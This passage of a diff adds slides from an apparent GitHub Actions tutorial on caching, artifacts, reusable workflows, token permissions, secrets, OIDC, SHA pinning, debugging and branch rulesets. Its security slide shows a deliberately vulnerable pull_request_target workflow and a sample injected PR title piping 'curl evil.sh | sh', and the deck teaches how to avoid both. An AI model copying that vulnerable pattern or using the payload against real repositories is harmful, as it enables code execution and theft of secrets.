+          <tr><td><a class="run" href="https://github.com/BrendanJamesLynskey/Introduction_to_GitHub_Actions/actions/runs/37214324617">run 37214324617</a> (first)</td><td>miss in every leg; one leg saved it</td><td>miss; saved per Python and OS</td></tr>
+          <tr><td><a class="run" href="https://github.com/BrendanJamesLynskey/Introduction_to_GitHub_Actions/actions/runs/37214874461">run 37214874461</a> (second)</td><td><span class="g">hit in all 5 legs</span>; build step skipped</td><td><span class="g">hit in all 5 legs</span></td></tr>
+        </tbody>
+      </table>
+      <pre style="margin-top:.4em;"><code class="language-text">Cache not found for input keys: data-Linux-f0fb67ba…
+Failed to save: Unable to reserve cache with key data-Linux-f0fb67ba…,
+  another job may be creating this cache.
+…
+Cache restored from key: data-Linux-f0fb67ba…</code></pre>
+      <p class="cap">The first run's legs raced to save the same key; the losers' "Failed to save" is a warning, not a failure. The key uses <code>runner.os</code> (<code>Linux</code>), so both Ubuntu versions share it.</p>
+      <div class="card blue dense">
+        <p>Unused entries are evicted after 7 days, and a repository holds 10 GB by default (<a href="https://docs.github.com/en/actions/reference/workflows-and-actions/dependency-caching">dependency caching</a>, October 2026). A run can restore caches from its own branch, the default branch and (for a PR) the base branch. Never cache secrets: anyone with read access can open a PR and read the base branch's caches.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ═══════════════════════════════ SLIDE 10 — ARTIFACTS ═══════════════════════════════ -->
+<section data-background-color="#eaeff2">
+  <div class="slide-hdr">
+    <span class="tag">09</span>
+    <h2>Artifacts, Job Summaries and Annotations</h2>
+  </div>
+  <div class="cols cols-2">
+    <div>
+      <pre><code class="language-yaml">    - name: Annotate
+      if: matrix.coverage
+      run: echo "::notice file=demo/stats.py,line=4::coverage leg ran on Python ${{ matrix.python }}"
+    - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
+      with:
+        name: junit-${{ matrix.python }}-${{ matrix.os }}
+        path: report-*.xml
+        retention-days: 5
+    - name: Job summary
+      run: |
+        {
+          echo "### Python ${{ matrix.python }} on ${{ matrix.os }}"
+          echo "| dataset cache hit | tests |"
+          echo "|---|---|"
+          echo "| ${{ steps.data.outputs.cache-hit == 'true' }} | $(grep -o 'tests=\"[0-9]*\"' report-*.xml) |"
+        } &gt;&gt; "$GITHUB_STEP_SUMMARY"
+        cat "$GITHUB_STEP_SUMMARY"   # also in the log, for readers without a GitHub login
+
+report:
+  needs: test
+  if: always()
+  runs-on: ubuntu-24.04
+  steps:
+    - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1
+      with:
+        pattern: junit-*
+        merge-multiple: true
+    - name: Summarise every leg
+      run: |
+        reports=(report-*.xml)
+        echo "### ${#reports[@]} JUnit reports; matrix result: ${{ needs.test.result }}" &gt;&gt; "$GITHUB_STEP_SUMMARY"
+        printf -- '- %s\n' "${reports[@]}" &gt;&gt; "$GITHUB_STEP_SUMMARY"
+        cat "$GITHUB_STEP_SUMMARY"</code></pre>
+    </div>
+    <div class="dense">
+      <img class="shot" src="images/artifacts.png" alt="The run's Artifacts table: five junit artifacts of about 425 bytes, each with a sha256 digest">
+      <p class="cap"><a class="run" href="https://github.com/BrendanJamesLynskey/Introduction_to_GitHub_Actions/actions/runs/37214874461">run 37214874461</a>. An <span class="a">artifact</span> is a file a job uploads to the run for people or later jobs to download. <code>retention-days: 5</code> made these expire on 9 October; the repository default is 90 days.</p>
+      <pre><code class="language-text">### Python 3.13 on ubuntu-24.04
+| dataset cache hit | tests |
+|---|---|
+| true | tests="4" |
+### 5 JUnit reports; matrix result: success</code></pre>
+      <p class="cap">A <span class="a">job summary</span> is Markdown appended to <code>$GITHUB_STEP_SUMMARY</code>; GitHub renders it on the run page (signed-in viewers only, so these steps also <code>cat</code> it into the log). An <span class="a">annotation</span> is a <code>::notice</code>, <code>::warning</code> or <code>::error</code> line that GitHub pins to a file and line (slide 06's screenshot).</p>
+    </div>
+  </div>
+</section>
+
+
+<!-- ═══════════════════════════════ SLIDE 11 — REUSE ═══════════════════════════════ -->
+<section data-background-color="#eaeff2">
+  <div class="slide-hdr">
+    <span class="tag">10</span>
+    <h2>Reuse: Composite Actions and Reusable Workflows</h2>
+  </div>
+  <div class="cols cols-3 code-sm">
+    <div>
+      <h3>Composite action</h3>
+      <pre><code class="language-yaml">name: Set up the demo
+description: Python with a pip cache, plus the demo's test dependencies (a composite action).
+inputs:
+  python-version:
+    description: Python version to install
+    default: "3.12"
+outputs:
+  pytest-version:
+    description: The pytest version installed
+    value: ${{ steps.v.outputs.pytest }}
+runs:
+  using: composite
+  steps:
+    - uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97 # v7.0.0
+      with:
+        python-version: ${{ inputs.python-version }}
+        cache: pip
+        cache-dependency-path: demo/requirements.txt
+    - shell: bash
+      run: pip install -r demo/requirements.txt
+    - id: v
+      shell: bash
+      run: echo "pytest=$(python -m pytest --version 2&gt;&amp;1 | awk '{print $2}')" &gt;&gt; "$GITHUB_OUTPUT"</code></pre>
+      <p class="cap"><code>.github/actions/setup-demo/action.yml</code>: a <span class="a">composite action</span> bundles several steps behind one <code>uses:</code>. Every <code>run</code> needs an explicit <code>shell</code>.</p>
+    </div>
+    <div>
+      <h3>Reusable workflow</h3>
+      <pre><code class="language-yaml">on:
+  workflow_call:
+    inputs:
+      python-version:
+        type: string
+        default: "3.12"
+    outputs:
+      pytest-version:
+        description: pytest version used by the tests
+        value: ${{ jobs.test.outputs.pytest }}
+
+permissions:
+  contents: read
+
+jobs:
+  test:
+    runs-on: ubuntu-24.04
+    outputs:
+      pytest: ${{ steps.setup.outputs.pytest-version }}
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+      - id: setup
+        uses: ./.github/actions/setup-demo
+        with:
+          python-version: ${{ inputs.python-version }}
+      - run: pytest -rs demo</code></pre>
+      <p class="cap">A <span class="a">reusable workflow</span> is a whole workflow (jobs, runners) that others call with <code>on: workflow_call</code>.</p>
+    </div>
+    <div>
+      <h3>The caller</h3>
+      <pre><code class="language-yaml">jobs:
+  py310:
+    uses: ./.github/workflows/demo-reusable.yml
+    with:
+      python-version: "3.10"
+  py313:
+    uses: ./.github/workflows/demo-reusable.yml
+    with:
+      python-version: "3.13"</code></pre>
+      <pre><code class="language-yaml">report:
+  needs: [py310, py313]
+  runs-on: ubuntu-24.04
+  steps:
+    - run: echo "pytest ${{ needs.py310.outputs.pytest-version }} on 3.10 and ${{ needs.py313.outputs.pytest-version }} on 3.13"</code></pre>
+      <pre><code class="language-text">pytest 8.4.2 on 3.10 and 8.4.2 on 3.13</code></pre>
+      <p class="cap"><a class="run" href="https://github.com/BrendanJamesLynskey/Introduction_to_GitHub_Actions/actions/runs/37214324885">run 37214324885</a>: the called jobs appear as <code>py310 / test</code> and <code>py313 / test</code>. Rule of thumb: share <i>steps</i> with a composite action, share <i>jobs</i> with a reusable workflow.</p>
+    </div>
+  </div>
+</section>
+
+
+<!-- ═══════════════════════════════ SLIDE 12 — OWN ACTION ═══════════════════════════════ -->
+<section data-background-color="#eaeff2">
+  <div class="slide-hdr">
+    <span class="tag">11</span>
+    <h2>Writing Your Own Action</h2>
+  </div>
+  <table class="tight">
+    <thead><tr><th>Kind</th><th><code>runs.using</code></th><th>Good for</th><th>Watch out for</th></tr></thead>
+    <tbody>
+      <tr><td><span class="a">Composite</span></td><td><code>composite</code></td><td>gluing existing steps and actions</td><td>no state between runs; set <code>shell</code> on every step</td></tr>
+      <tr><td><span class="g">JavaScript</span></td><td><code>node24</code></td><td>fast start, any OS, calling GitHub's API</td><td>commit the bundled code (no <code>npm install</code> at run time); keep Node versions current</td></tr>
+      <tr><td><span class="p">Docker container</span></td><td><code>docker</code></td><td>a fixed toolchain in any language</td><td>Linux runners only; built from a Dockerfile, the image builds on every run, so it starts slower</td></tr>
+    </tbody>
+  </table>
+  <div class="cols cols-2" style="margin-top:.3em;">
+    <div>
+      <pre><code class="language-yaml">name: JS hello
+description: A JavaScript action with no dependencies.
+inputs:
+  who:
+    description: Who to greet
+    default: world
+outputs:
+  greeting:
+    description: The greeting it made
+runs:
+  using: node24
+  main: index.js</code></pre>
+      <pre><code class="language-javascript">// Inputs arrive as INPUT_&lt;NAME&gt; environment variables; outputs go to the $GITHUB_OUTPUT file.
+const fs = require("fs");
+const who = process.env.INPUT_WHO || "world";
+const greeting = `Hello, ${who}, from Node ${process.version}`;
+console.log(greeting);
+fs.appendFileSync(process.env.GITHUB_OUTPUT, `greeting=${greeting}\n`);</code></pre>
+    </div>
+    <div>
+      <pre><code class="language-yaml">name: Docker hello
+description: A Docker container action (Linux runners only).
+inputs:
+  who:
+    description: Who to greet
+    default: world
+runs:
+  using: docker
+  image: Dockerfile
+  args: ["${{ inputs.who }}"]</code></pre>
+      <pre><code class="language-dockerfile">FROM alpine:3.20
+COPY entrypoint.sh /entrypoint.sh
+ENTRYPOINT ["/bin/sh", "/entrypoint.sh"]</code></pre>
+      <pre><code class="language-text">Hello, Actions, from Node v24.19.0
+Hello, Actions, from 3.20.10 inside a container
+JS action said 'Hello, Actions, from Node v24.19.0'</code></pre>
+      <p class="cap">Both ran in <a class="run" href="https://github.com/BrendanJamesLynskey/Introduction_to_GitHub_Actions/actions/runs/37214324885">run 37214324885</a> (job <code>own-actions</code>). A real JavaScript action would normally use the <a href="https://github.com/actions/toolkit">actions/toolkit</a> packages; this one uses only the <code>INPUT_*</code> variables and the <code>$GITHUB_OUTPUT</code> file they wrap.</p>
+    </div>
+  </div>
+</section>
+
+
+<!-- ═══════════════════════════════ SLIDE 13 — TOKEN ═══════════════════════════════ -->
+<section data-background-color="#eaeff2">
+  <div class="slide-hdr">
+    <span class="tag">12</span>
+    <h2>Security: A Least-Privilege GITHUB_TOKEN</h2>
+  </div>
+  <div class="cols cols-2">
+    <div>
+      <pre><code class="language-yaml">permissions: {}   # nothing by default; each job asks for what it needs
+
+jobs:
+  read-only:
+    runs-on: ubuntu-24.04
+    permissions:
+      contents: read
+    steps:
+      - name: Reading the repo works
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: gh api "repos/$GITHUB_REPOSITORY/contents/README.md" --jq .name
+      - name: Writing (creating an issue label) is refused
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          if gh api -X POST "repos/$GITHUB_REPOSITORY/labels" -f name="demo-$GITHUB_RUN_ID" &gt; out.txt 2&gt; err.txt; then
+            echo "::error::the token could write, which it should not"; exit 1
+          fi
+          echo "refused as expected: $(grep -o 'HTTP [0-9]*' err.txt | head -1)"
+          echo "Write refused: \`$(grep -o 'HTTP [0-9]*' err.txt | head -1)\`" &gt;&gt; "$GITHUB_STEP_SUMMARY"</code></pre>
+      <pre><code class="language-text">README.md
+refused as expected: HTTP 403</code></pre>
+      <p class="cap"><a class="run" href="https://github.com/BrendanJamesLynskey/Introduction_to_GitHub_Actions/actions/runs/37214432837">run 37214432837</a>: reading worked; creating a label got <code>403 Resource not accessible by integration</code>.</p>
+    </div>
+    <div class="dense">
+      <div class="card amber">
+        <ul>
+          <li>Every job gets a <span class="a">GITHUB_TOKEN</span>: a short-lived credential for this repository, created when the job starts and revoked when it ends</li>
+          <li><code>permissions:</code> sets its <span class="a">scopes</span> (what it may touch): <code>contents</code>, <code>issues</code>, <code>pull-requests</code>, <code>id-token</code>…, each <code>read</code>, <code>write</code> or <code>none</code></li>
+          <li>Set <code>permissions: {}</code> (nothing) at the top and grant per job. Any scope you list is granted; every scope you don't list becomes <code>none</code></li>
+          <li>This repository's default is read-only (<code>default_workflow_permissions: read</code>); older repositories and organisations may still default to read-write, so say it explicitly</li>
+          <li>A <span class="a">least-privilege</span> token limits the damage if a step, or an action you pulled in, is compromised</li>
+        </ul>
+      </div>
+      <div class="card red" style="margin-top:.4em;">
+        <p>Pull requests from <span class="r">forks</span> get a read-only token and no secrets on <code>pull_request</code>, whatever the workflow asks for. That is a safety feature; slide 15 shows the trigger that removes it.</p>
+      </div>
+      <p class="cap"><a href="https://docs.github.com/en/actions/concepts/security/github_token">GITHUB_TOKEN</a> · <a href="https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax#permissions">permissions syntax</a></p>
+    </div>
+  </div>
+</section>
+
+
+<!-- ═══════════════════════════════ SLIDE 14 — SECRETS & ENVIRONMENTS ═══════════════════════════════ -->
+<section data-background-color="#eaeff2">
+  <div class="slide-hdr">
+    <span class="tag">13</span>
+    <h2>Secrets and Environments</h2>
+  </div>
+  <div class="cols cols-2">
+    <div>
+      <pre><code class="language-yaml">jobs:
+  deploy:
+    runs-on: ubuntu-24.04
+    environment: demo   # a 1-minute wait timer and a main-only branch rule protect it
+    steps:
+      - name: Use an environment secret
+        env:
+          DEMO_SECRET: ${{ secrets.DEMO_SECRET }}
+        run: |
+          echo "the secret is: $DEMO_SECRET"        # the log shows ***
+          echo "its length is ${#DEMO_SECRET}"</code></pre>
+      <pre><code class="language-text">the secret is: ***
+its length is 32</code></pre>
+      <div class="card amber dense" style="margin-top:.3em;">
+        <ul>
+          <li>A <span class="a">secret</span> is an encrypted value set in the repository, organisation or environment settings (or <code>gh secret set</code>). Workflows read it as <code>secrets.NAME</code></li>
+          <li>The log <span class="a">masks</span> the exact value as <code>***</code>. A transformed value (base64, a substring) is not masked</li>
+          <li>Pass secrets through <code>env:</code> to the steps that need them, never in <code>with:</code> of untrusted actions</li>
+        </ul>
+      </div>
+    </div>
+    <div>
+      <img class="shot" src="images/env_run.png" alt="Run page of the environment demo: the deploy job succeeded, and a Deployment protection rules table shows a 1 minute wait timer on environment demo">
+      <p class="cap"><a class="run" href="https://github.com/BrendanJamesLynskey/Introduction_to_GitHub_Actions/actions/runs/37214444150">run 37214444150</a>: queued 15:49:23, job started 15:50:27.</p>
+      <div class="card green dense">
+        <ul>
+          <li>An <span class="g">environment</span> (e.g. <code>staging</code>, <code>production</code>) is a named deployment target with its own secrets and <span class="g">protection rules</span></li>
+          <li>Rules: required reviewers (a person approves), a wait timer, and which branches may deploy. This demo's <code>demo</code> environment has a 1-minute timer and allows <code>main</code> only</li>
+          <li>Required reviewers and wait timers work on any public repo; on private repos they need GitHub Enterprise (<a href="https://docs.github.com/en/actions/reference/workflows-and-actions/deployments-and-environments">docs</a>)</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ═══════════════════════════════ SLIDE 15 — OIDC, PINNING, DEPENDABOT ═══════════════════════════════ -->
+<section data-background-color="#eaeff2">
+  <div class="slide-hdr">
+    <span class="tag">14</span>
+    <h2>OIDC, Pinning by SHA, and Dependabot</h2>
+  </div>
+  <div class="cols cols-2">
+    <div>
+      <h3>OIDC instead of long-lived cloud keys</h3>
+      <pre><code class="language-yaml">oidc-claims:
+  runs-on: ubuntu-24.04
+  permissions:
+    id-token: write   # lets the job ask GitHub for a signed OIDC token
+  steps:
+    - name: Request a token and print its claims (never the token itself)
+      run: |
+        RESP=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+               "$ACTIONS_ID_TOKEN_REQUEST_URL&amp;audience=sts.example.com")</code></pre>
+      <pre><code class="language-text">iss           https://token.actions.githubusercontent.com
+aud           sts.example.com
+sub           repo:BrendanJamesLynskey@27049659/Introduction_to_GitHub_Actions@1404583061:ref:refs/heads/main
+ref           refs/heads/main
+event_name    push</code></pre>
+      <p class="cap"><a class="run" href="https://github.com/BrendanJamesLynskey/Introduction_to_GitHub_Actions/actions/runs/37214432837">run 37214432837</a> printed the claims, never the token. <span class="a">OIDC</span> (OpenID Connect): the job asks GitHub for a signed, minutes-long identity token; the cloud checks the claims (this repo, this branch) and swaps it for temporary credentials. No cloud key is stored in GitHub. The cloud side (an AWS role trust policy, an Azure federated credential, GCP workload identity) was <b>not run here</b>: no cloud account. See <a href="https://docs.github.com/en/actions/concepts/security/openid-connect">OpenID Connect</a>.</p>
+    </div>
+    <div class="dense">
+      <h3>Pin third-party actions to a full commit SHA</h3>
+      <pre><code class="language-yaml">- uses: actions/checkout@v7          # a tag: its owner can move it
+- uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1</code></pre>
+      <div class="card red">
+        <p>A tag or branch can be re-pointed at new code by whoever controls (or compromises) that repository; a full 40-character SHA cannot. Every workflow in this repo pins by SHA, and the run log confirms it: <code>Download action repository 'actions/checkout@3d3c42e5…' (SHA:3d3c42e5…)</code>.</p>
+      </div>
+      <h3 style="margin-top:.35em;">Dependabot keeps the pins current</h3>
+      <pre><code class="language-yaml">version: 2
+updates:
+  - package-ecosystem: github-actions
+    directory: /
+    schedule:
+      interval: weekly</code></pre>
+      <p class="cap"><span class="a">Dependabot</span> is GitHub's bot that opens pull requests to update dependencies; with <code>github-actions</code> it bumps the SHA and its <code># v7.0.1</code> comment together. Its first scan ran green (<a class="run" href="https://github.com/BrendanJamesLynskey/Introduction_to_GitHub_Actions/actions/runs/37214327007">run 37214327007</a>) and found nothing to update.</p>
+    </div>
+  </div>
+</section>
+
+
+<!-- ═══════════════════════════════ SLIDE 16 — INJECTION ═══════════════════════════════ -->
+<section data-background-color="#eaeff2">
+  <div class="slide-hdr">
+    <span class="tag">15</span>
+    <h2>pull_request_target and Script Injection</h2>
+  </div>
+  <div class="cols cols-2 code-sm">
+    <div>
+      <h3 class="r">Don't: two classic mistakes</h3>
+      <pre><code class="language-yaml">name: Comment on pull requests
+on: pull_request_target            # runs with a write token and secrets, even for forks
+
+jobs:
+  greet:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}   # checks out the fork's code...
+      - run: |
+          echo "Title: ${{ github.event.pull_request.title }}"   # ...and pastes its title into a script
+          ./build.sh                                              # ...then runs the fork's code</code></pre>
+      <pre><code class="language-text">bad-injection.yml:13:31: "github.event.pull_request.title" is potentially untrusted. avoid using it directly in inline scripts. instead, pass it through an environment variable. see https://docs.github.com/en/actions/reference/security/secure-use#… [expression]</code></pre>
+      <p class="cap"><code>actionlint</code> 1.7.12 output (kept outside <code>.github/workflows</code>, never run). It catches the injection, but not the <code>pull_request_target</code> + fork checkout pattern: review that by eye.</p>
+    </div>
+    <div class="dense">
+      <div class="card red">
+        <ul>
+          <li><code>pull_request_target</code> runs the <i>base</i> repository's workflow with a write token and secrets, even for a fork's PR. Safe only if it never runs the fork's code</li>
+          <li><span class="r">Script injection</span>: <code>${{ }}</code> is pasted into the script text <i>before</i> the shell runs. A PR titled <code>"; curl evil.sh | sh; "</code> becomes shell code</li>
+        </ul>
+      </div>
+      <h3 class="g" style="margin-top:.3em;">Do: untrusted text through <code>env</code></h3>
+      <pre><code class="language-yaml">name: Comment on pull requests
+on: pull_request
+
+permissions:
+  contents: read
+
+jobs:
+  greet:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Print the title safely
+        env:
+          TITLE: ${{ github.event.pull_request.title }}
+        run: |
+          printf 'Title: %s\n' "$TITLE"</code></pre>
+      <pre><code class="language-text">level=full dry_run=false
+note=$(whoami); echo injected</code></pre>
+      <p class="cap"><a class="run" href="https://github.com/BrendanJamesLynskey/Introduction_to_GitHub_Actions/actions/runs/37214439700">run 37214439700</a>: the dispatch demo passes <code>inputs.note</code> through <code>env</code>; given <code>$(whoami); echo injected</code>, it printed the text and ran nothing. Untrusted fields include PR titles and bodies, branch names, issue and comment text, and commit messages. See <a href="https://docs.github.com/en/actions/reference/security/secure-use">Secure use reference</a>.</p>
+    </div>
+  </div>
+</section>
+
+
+<!-- ═══════════════════════════════ SLIDE 17 — DEBUGGING ═══════════════════════════════ -->
+<section data-background-color="#eaeff2">
+  <div class="slide-hdr">
+    <span class="tag">16</span>
+    <h2>Debugging a Workflow</h2>
+  </div>
+  <div class="cols cols-2">
+    <div>
+      <img class="shot" src="images/failed_run.png" alt="A failed CI run: the Demo gate job is red, and an annotation says Process completed with exit code 1">
+      <p class="cap"><a class="run" href="https://github.com/BrendanJamesLynskey/Introduction_to_GitHub_Actions/actions/runs/37214705396">run 37214705396</a>, as a logged-out visitor sees it: the red job and its annotation. Step logs need a signed-in GitHub account; <code>gh run view RUN --log-failed</code> prints just the failing step:</p>
+      <pre><code class="language-text">    def test_median_odd_and_even():
+&gt;       assert median([3, 1, 2]) == 3  # deliberately wrong: the ruleset demo
+E       assert 2 == 3
+E        +  where 2 = median([3, 1, 2])
+demo/test_stats.py:11: AssertionError
+========================= 1 failed, 3 passed in 0.25s ==========================
+##[error]Process completed with exit code 1.</code></pre>
+    </div>
+    <div class="dense">
+      <div class="card amber">
+        <h3 class="a">A routine</h3>
+        <ul>
+          <li>Read the first red step's log from its <i>first</i> error, not the last line</li>
+          <li>Re-run with <span class="a">debug logging</span>: tick <i>Enable debug logging</i> in <i>Re-run jobs</i>, or <code>gh run rerun RUN --debug</code>. For every run, set the variable <code>ACTIONS_STEP_DEBUG=true</code> (step detail) or <code>ACTIONS_RUNNER_DEBUG=true</code> (runner diagnostics)</li>
+          <li>Lint before pushing: <code>actionlint</code> catches bad expressions, unknown keys, injection and (with shellcheck) shell bugs</li>
+          <li>Make the job print what it is about to do: tool versions, key paths, a <code>cat</code> of the summary</li>
+        </ul>
+      </div>
+      <pre><code class="language-text">##[debug]Evaluating: steps.s.outputs.stamp
+##[debug]Result: '20261004T155230-f592127'</code></pre>
+      <p class="cap"><a class="run" href="https://github.com/BrendanJamesLynskey/Introduction_to_GitHub_Actions/actions/runs/37214324637">run 37214324637</a>, attempt 2 with <code>--debug</code>: 274 <code>##[debug]</code> lines.</p>
+      <div class="card blue">
+        <p><span class="b">Running locally:</span> <a href="https://github.com/nektos/act">act</a> runs workflows in Docker on your machine. <b>Not run here</b>: this PC has no Docker. It approximates the hosted images, so treat a green <code>act</code> run as a hint, not proof.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ═══════════════════════════════ SLIDE 18 — REAL FAILURES ═══════════════════════════════ -->
+<section data-background-color="#eaeff2">
+  <div class="slide-hdr">
+    <span class="tag">17</span>
+    <h2>Real Failures from This GitHub</h2>
+  </div>
+  <div class="cols cols-3 dense">
+    <div class="card red">
+      <h3 class="r">A test fixture git ignored</h3>
+      <p>3 Oct 2026, <a href="https://github.com/BrendanJamesLynskey/Disaggregated_Inference_Sim">Disaggregated_Inference_Sim</a>: the first CI run (<a class="run" href="https://github.com/BrendanJamesLynskey/Disaggregated_Inference_Sim/actions/runs/37138193008">run 37138193008</a>) failed with</p>
+      <pre><code class="language-text">FileNotFoundError: … tests/fixtures/simfront_llama3_8b.json
+1 failed, 35 passed</code></pre>
+      <p><code>.gitignore</code> had <code>*.json</code>, so the fixture existed only on the laptop where tests passed. Fixed by committing it with a <code>!tests/fixtures/*.json</code> exception (<a href="https://github.com/BrendanJamesLynskey/Disaggregated_Inference_Sim/commit/eae7f7d">eae7f7d</a>), green in <a class="run" href="https://github.com/BrendanJamesLynskey/Disaggregated_Inference_Sim/actions/runs/37138267111">run 37138267111</a>. <b>Lesson:</b> CI starts from a clean checkout; that is its job.</p>
+    </div>
+    <div class="card amber">
+      <h3 class="a">Green, but a test never ran</h3>
+      <p>The simulators' JavaScript-port parity tests call <code>pytest.skip("node not installed")</code> when Node is missing. Reproduced in <a class="run" href="https://github.com/BrendanJamesLynskey/Introduction_to_GitHub_Actions/actions/runs/37214324624">run 37214324624</a>:</p>
+      <pre><code class="language-text">No Node:   SKIPPED [1] demo/test_parity.py:18:
+           node not installed
+           3 passed, 1 skipped
+Required:  4 passed</code></pre>
+      <p>Both jobs are green. <b>Lesson:</b> install what the tests need (<code>setup-node</code>), run <code>pytest -rs</code> so skips are listed, and make CI turn the skip into a failure (<code>REQUIRE_NODE=1</code> here).</p>
+    </div>
+    <div class="card purple">
+      <h3 class="p">A stale git dependency</h3>
+      <p>Jenkins jobs on this GitHub installed a sister simulator with <code>pip install "pkg @ git+https://…"</code> into a reused virtualenv. pip saw the package already installed and kept the old commit, so builds tested stale code and failed (SimEng 07 notes). Fixed with <code>--force-reinstall</code>.</p>
+      <p><b>On Actions:</b> hosted runners start clean, so the trap returns only if you <i>cache</i> a virtualenv (or <code>site-packages</code>) keyed on a lock file that doesn't name the git commit, or use a persistent self-hosted runner. Key on the resolved commit, or don't cache environments.</p>
+    </div>
+  </div>
+</section>
+
+
+<!-- ═══════════════════════════════ SLIDE 19 — COST & LIMITS ═══════════════════════════════ -->
+<section data-background-color="#eaeff2">
+  <div class="slide-hdr">
+    <span class="tag">18</span>
+    <h2>Cost, Limits and Speed</h2>
+  </div>
+  <div class="cols cols-2">
+    <div>
+      <pre><code class="language-yaml">on:
+  workflow_dispatch:
+
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+
+permissions:
+  contents: read
+
+jobs:
+  slow:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 5
+    steps:
+      - run: sleep 90 &amp;&amp; echo "finished (not cancelled)"</code></pre>
+      <img class="shot" src="images/concurrency_cancelled.png" alt="The first concurrency demo run is shown as Cancelled; its annotation reads: Canceling since a higher priority waiting request for Demo: concurrency group-refs/heads/main exists" style="margin-top:.3em;">
+      <p class="cap">Dispatched twice, 22 s apart: <a class="run" href="https://github.com/BrendanJamesLynskey/Introduction_to_GitHub_Actions/actions/runs/37214446270">run 37214446270</a> was cancelled, <a class="run" href="https://github.com/BrendanJamesLynskey/Introduction_to_GitHub_Actions/actions/runs/37214470039">run 37214470039</a> finished.</p>
+    </div>
+    <div class="dense">
+      <div class="card amber">
+        <h3 class="a">Speed and spend</h3>
+        <ul>
+          <li><span class="a">Concurrency group</span>: runs sharing a group name don't overlap; <code>cancel-in-progress: true</code> cancels the older one. Use the branch in the name so a new push cancels its own stale run, not other branches'</li>
+          <li><code>timeout-minutes</code>: a hung job otherwise runs for the 6-hour limit</li>
+          <li><span class="a">Path filters</span> (<code>paths</code>, <code>paths-ignore</code>) skip workflows that a change can't affect. Never on a required check: a skipped workflow never reports, and the PR waits for ever (slide 20)</li>
+          <li>Caches; fewer matrix legs on PRs, all of them nightly</li>
+        </ul>
+      </div>
+      <table class="tight" style="margin-top:.35em;">
+        <thead><tr><th>Limit (October 2026)</th><th>Value</th></tr></thead>
+        <tbody>
+          <tr><td>Public repos, standard hosted runners</td><td>free</td></tr>
+          <tr><td>Private repos, included minutes / month</td><td>Free 2,000 · Pro 3,000 · Team 3,000; then billed per minute</td></tr>
+          <tr><td>Concurrent jobs, standard runners</td><td>Free 20 · Pro 40 · Team 60</td></tr>
+          <tr><td>Job run time, hosted runner</td><td>6 hours</td></tr>
+          <tr><td>Workflow run time (incl. waiting)</td><td>35 days</td></tr>
+          <tr><td>Matrix size</td><td>256 jobs per run</td></tr>
+        </tbody>
+      </table>
+      <p class="cap">These change: check <a href="https://docs.github.com/en/actions/reference/limits">Actions limits</a> and <a href="https://docs.github.com/en/actions/concepts/billing-and-usage">billing and usage</a> before planning around them. Minutes on Windows and macOS runners cost more than Linux.</p>
+    </div>
+  </div>
+</section>
+
+
+<!-- ═══════════════════════════════ SLIDE 20 — PROTECTING MAIN ═══════════════════════════════ -->
+<section data-background-color="#eaeff2">
+  <div class="slide-hdr">
+    <span class="tag">19</span>
+    <h2>Protecting main: Branch Protection and Rulesets</h2>
+  </div>
+  <div class="cols cols-6040">
+    <div class="dense">
+      <div class="card amber">
+        <h3 class="a">The words</h3>
+        <ul>
+          <li><span class="a">Protected branch</span>: a branch GitHub guards with rules, so nobody can break it by accident</li>
+          <li><span class="a">Branch protection rule</span>: the older mechanism; one rule per branch pattern, visible only to admins</li>
+          <li><span class="a">Ruleset</span>: the newer one. Several can apply to a branch at once, they can be switched off without deleting, and anyone with read access can see them</li>
+          <li><span class="a">Required status check</span>: a named check that must pass before a PR can merge</li>
+          <li><span class="a">Require branches to be up to date</span> (strict): the PR must also contain the latest <code>main</code>, so checks ran on what will be merged. Safer; costs a rebase and a re-run whenever <code>main</code> moves</li>
+          <li><span class="a">Required reviews</span>: N approvals from people with write access</li>
+          <li><span class="a">Block force pushes / deletions</span>: history on <code>main</code> can't be rewritten, and the branch can't be deleted</li>
+          <li><span class="a">Bypass list</span> (rulesets) or <span class="a">include administrators</span> (branch protection): who may ignore the rules. An empty bypass list means the owner is blocked too</li>
+        </ul>
+      </div>
+      <p class="cap"><a href="https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/managing-rulesets/about-rulesets">About rulesets</a> · <a href="https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/managing-protected-branches/about-protected-branches">About protected branches</a></p>
+    </div>
+    <div>
+      <img class="shot" src="images/ruleset.png" alt="The public view of this repository's ruleset Protect main: Active, targets the default branch, rules Restrict deletions, Require a pull request before merging, Require status checks to pass, Block force pushes">
+      <p class="cap">This repo's ruleset, viewed logged out: <code>Protect main</code>, active on the default branch.</p>
+    </div>
+  </div>
+</section>
+
+
+<!-- ═══════════════════════════════ SLIDE 21 — REQUIRED CHECKS DEMO ═══════════════════════════════ -->
+<section data-background-color="#eaeff2">
+  <div class="slide-hdr">
+    <span class="tag">20</span>
+    <h2>Required Checks, Shown Blocking</h2>
+  </div>
+  <div class="cols cols-2">
+    <div class="dense">
+      <table class="tight">
+        <thead><tr><th>Setting on <code>Protect main</code></th><th>Value</th></tr></thead>
+        <tbody>
+          <tr><td>Target</td><td>default branch (<code>main</code>)</td></tr>
+          <tr><td>Require a pull request</td><td>yes, 0 approvals (a single-owner repo can't approve its own PRs)</td></tr>
+          <tr><td>Required status checks</td><td><code>Demo gate</code>, from the GitHub Actions app</td></tr>
+          <tr><td>Require up to date (strict)</td><td>off</td></tr>
